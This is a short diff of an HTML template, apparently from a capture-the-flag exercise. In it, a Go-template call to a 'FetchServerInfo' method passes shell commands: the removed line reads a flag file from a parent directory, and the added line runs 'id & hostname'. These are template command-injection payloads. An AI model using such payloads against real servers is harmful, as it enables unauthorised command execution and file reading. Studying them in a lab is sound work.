@@ -2,7 +2,7 @@
 <head>
  </head>
  <body>
-    <p>{{.FetchServerInfo "cat ../flaga25d8ebc00.txt"}}</p>
+    <p>{{.FetchServerInfo "id & hostname"}}</p>
  <!--some body-->
  </body>
 </html>
